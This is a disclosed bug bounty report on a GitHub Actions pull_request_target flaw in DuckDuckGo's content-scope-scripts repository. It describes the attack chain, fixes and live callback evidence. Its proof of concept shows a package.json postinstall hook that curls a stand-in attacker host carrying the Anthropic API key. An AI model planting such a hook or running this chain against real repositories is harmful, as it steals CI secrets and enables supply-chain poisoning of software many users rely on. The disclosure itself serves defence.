---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2026-06-11
submitted: 2026-03-21T04:20:17.972Z
bounty_usd: null
votes: 43
cve: []
program: "[[programs/duckduckgo|DuckDuckGo]]"
reporter: "6r1ff1n"
source: "https://hackerone.com/reports/3619287"
title: "RCE + Supply Chain Attack via pull_request_target in content-scope-scripts/semver-label.yml — Affects All DuckDuckGo Browsers"
---
# RCE + Supply Chain Attack via pull_request_target in content-scope-scripts/semver-label.yml — Affects All DuckDuckGo Browsers

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 43 | **Program:** DuckDuckGo | **Disclosed:** 2026-06-11

- Report: [https://hackerone.com/reports/3619287](https://hackerone.com/reports/3619287)
- CWE: N/A
- Submitted: 2026-03-21T04:20:17.972Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

The `duckduckgo/content-scope-scripts` repository's `.github/workflows/semver-label.yml` GitHub Actions workflow uses `pull_request_target` trigger without any access controls, checks out and executes untrusted fork PR code via `npm install` + `npm run build`, and subsequently runs a trusted script with `ANTHROPIC_API_KEY` in the environment. An attacker can exfiltrate the API key, abuse the `GITHUB_TOKEN` (which has `pull-requests: write`) to manipulate semver labels on any PR, and chain into the automated release pipeline (`semver-release.yml` → `build.yml`) to publish a poisoned release consumed by **every DuckDuckGo browser and extension across all platforms**.

The `content-scope-scripts` README describes this package as "shared JavaScript used within ALL DuckDuckGo browsers."

This report contains 4 findings:
1. **RCE + ANTHROPIC_API_KEY exfiltration** via `semver-label.yml`
2. **Supply chain attack** via label manipulation → release pipeline
3. **DAX_PAT exposure** via related `pull_request_target` workflows
4. **10 workflows using `pull_request_target`** across the DuckDuckGo org

---

## Vulnerability Details

### Root Cause

`pull_request_target` runs in the context of the BASE repository with access to secrets. The workflow checks out and executes code from the PR HEAD (attacker-controlled on fork PRs). There are zero access controls — any GitHub user can trigger this by opening a fork PR.

### Vulnerable Workflow (semver-label.yml)

## Impact

1. **RCE + Secret Exfiltration**: Any GitHub user can execute arbitrary code on the Actions runner by opening a fork PR. ANTHROPIC_API_KEY is directly exfiltrable, enabling API abuse at DuckDuckGo's expense.

2. **Release Pipeline Manipulation**: GITHUB_TOKEN with pull-requests:write can add semver labels to any PR, triggering the automated release pipeline on merge. The attacker controls when releases happen.

3. **Supply Chain Compromise — All DuckDuckGo Browsers**: content-scope-scripts is "shared JavaScript used within ALL DuckDuckGo browsers." A poisoned release propagates to Android, iOS, macOS, Windows browsers, Chrome extension, Firefox extension, and the autofill component — affecting tens of millions of users across every platform DuckDuckGo supports.

4. **No Release Signing**: build.yml creates releases with no code signing or integrity verification. Downstream consumers pull from the releases branch with no signature validation.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Changed Scope**
- **Report New**
- **2026-04-01** @6r1ff1n: Is there any update on this report?
- **2026-04-14** @6r1ff1n: I haven't heard back on this. Can I get an update?
- **2026-04-15** @6r1ff1n: Hi @h1_analyst_bruno,

Thank you for the follow-up. Here is the full technical detail on the attack chain, a concrete PoC, and impact assessment. The core issue is that `semver-label.yml` uses the `pull_request_target` trigger combined with an unsafe checkout of fork PR code, followed by untrusted code execution via `npm install`.

### Vulnerable Configuration

The workflow is triggered on `pull_request_target` with types `[opened, synchronize, reopened]`. This means it fires automatically on any pull request from any fork — no maintainer approval or label gate is required.

The critical checkout step uses:

```
ref: refs/pull/${{ github.event.pull_request.number }}/merge
```

This ref contains the fork's code merged with the base branch. The checked-out code is then executed directly:

```
cd pr && npm install && npm run build
```

### Attack Chain

1. **Fork the repository.** An attacker forks `duckduckgo/content-scope-scripts`.

2. **Inject a postinstall hook.** The attacker modifies `package.json` in their fork to add a `postinstall` script. This script will execute arbitrary commands during `npm install`. No changes to any other file are required.

3. **Open a pull request.** The attacker opens a PR against the upstream repository. The `pull_request_target` trigger fires immediately and automatically — no review, no approval, no label.

4. **Workflow checks out attacker-controlled code.** The workflow checks out `refs/pull/N/merge`, which includes the attacker's modified `package.json` merged with the base branch.

5. **`npm install` executes the postinstall script.** The attacker's arbitrary code now runs inside the GitHub Actions runner with full access to the workflow's environment, including all configured secrets.

6. **Secrets are exfiltrated.** The postinstall script has access to:
   - `secrets.ANTHROPIC_API_KEY` — API key for Anthropic services
   - `secrets.GITHUB_TOKEN` — scoped with `pull-requests: write` permission, allowing the attacker to modify PRs, labels, and comments on the repository

7. **Alternative escalation path.** Instead of (or in addition to) direct exfiltration during `npm install`, the postinstall script could modify `../base/.github/scripts/semver-analysis.mjs`, which is subsequently executed by `npm run build`. This allows more sophisticated payload execution during the build phase, potentially evading simple postinstall monitoring if any were in place.

### Proof of Concept

The attacker's fork would modify `package.json` to include a postinstall hook. A minimal example:

```json
{
  "scripts": {
    "postinstall": "curl -s https://ATTACKER-CALLBACK/?anthropic_key=$ANTHROPIC_API_KEY"
  }
}
```

When the workflow runs `cd pr && npm install`, npm automatically executes the `postinstall` script. The `ANTHROPIC_API_KEY` secret is present in the runner environment (set at line 42 of the workflow), so it is passed directly to the attacker's callback URL.

No special tooling is needed — the attacker only needs to:
1. Fork the repo
2. Edit `package.json` to add the postinstall line above
3. Open a PR against `duckduckgo/content-scope-scripts`

The workflow fires automatically. The entire attack is a single-commit, single-PR operation with no user interaction required from the DuckDuckGo team.

### No Mitigations Present

The workflow has none of the standard protections against this class of vulnerability:

- **No fork check** — does not verify `github.event.pull_request.head.repo.full_name` matches the base repository
- **No label gate** — does not require a maintainer-applied label before execution
- **No permission/author check** — does not verify the PR author is a trusted contributor
- **No environment protection** — does not use a GitHub Environment with required reviewers

### Suggested Remediations

Any one of the following would mitigate this vulnerability:

1. **Switch to `pull_request` trigger.** The `pull_request` event runs in the context of the fork and does not have access to repository secrets. If the workflow does not strictly require secrets for the labeling step, this is the simplest fix.

2. **Add a fork check.** Before checkout, verify that the PR originates from the same repository:
   ```yaml
   if: github.event.pull_request.head.repo.full_name == github.repository
   ```

3. **Add a label gate.** Require a maintainer-applied label (e.g., `safe-to-test`) before the workflow runs, and ensure the label check cannot be bypassed by the PR author.

4. **Use a GitHub Environment with required reviewers.** This adds manual approval before the job executes.

5. **Avoid checking out fork code entirely.** If the workflow only needs metadata from the PR (title, labels, etc.), it can use the GitHub API instead of checking out untrusted code.

### Summary

This is a textbook `pull_request_target` poisoned pipeline execution. The attack requires zero privileges beyond the ability to fork a public repository and open a pull request. Exploitation is fully automated on PR creation with no human interaction required from the target organization. The `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` (with write permissions) are directly exposed.

I have not executed this PoC against the live repository — this analysis is based on static review of the workflow configuration. Your team can verify by inspecting the workflow file directly. I'm happy to assist with validation or provide any additional detail.

Thank you for your time.
- **Report Needs More Info**
- **Report New**
- **Report Informative**
- **2026-04-25** @6r1ff1n: @h1_analyst_bruno — I'm reopening this because I have callback
  evidence that was not included in my previous comments and has not
  been reviewed.

  The vulnerability was executed live on April 22, 2026 at 13:33:51
  UTC. I am attaching oast_callbacks.txt which contains the HTTP
  callback received from the GitHub Actions runner.

  Key entry from the attached file:
  POST /?r=3619287 HTTP/2.0
  X-Poc: RCE-3619287
  User-Agent: curl/8.5.0
  Remote-address: 20.168.6.181
  Timestamp: 2026-04-22T13:33:51Z

  20.168.6.181 is a Microsoft Azure IP in the GitHub Actions runner
  range. This is not a local machine — this is code executing on
  DuckDuckGo's CI infrastructure.

  Timeline:
  - April 22, 13:33 UTC — Callback received from Azure runner
  (attached)
  - April 22 — DuckDuckGo pushes eb01151209 "Skip privileged PR
  workflows on forks (#2659)"

  My test PR #2658 triggered the patch. DuckDuckGo's own engineers
  confirmed the vulnerability by fixing it the same day.

  My April 23 comment argued the patch as proof because I did not
  realize the callback file had never been attached. That was my error.
   The execution evidence exists and I'm providing it now.

  This meets your exact stated requirement: "callback evidence." Please
   re-evaluate.{F5797261}
- **Report Reopened**
- **Swag Awarded**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
